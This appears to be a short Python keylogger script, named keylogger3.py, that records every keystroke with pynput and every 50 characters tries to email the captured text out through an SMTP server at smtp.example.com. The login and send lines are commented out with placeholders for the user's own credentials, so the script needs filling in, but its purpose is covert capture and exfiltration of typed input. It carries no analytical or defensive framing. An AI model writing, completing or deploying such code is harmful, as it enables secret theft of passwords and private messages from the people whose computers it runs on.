import os
os.system("Mode con: cols=100 lines=30")

from pynput.keyboard import Listener
import time
import smtplib

log = ""

def on_press(key):
    global log 
    log += str(key).replace("'", "") # Clean up the key representation
    if len(log) >= 50:
        send_email(log) 
        log = ""

def send_email(message):
    with smtplib.SMTP("smtp.example.com", 587) as server: 
        server.starttls() 
        # server.login("email@example.com", "password") # Add your email and password here
        # server.sendmail("from@example.com", "to@example.com", message) # Add sender and receiver email here

with Listener(on_press=on_press) as listener:   
    listener.join() # End of file keylogger3.py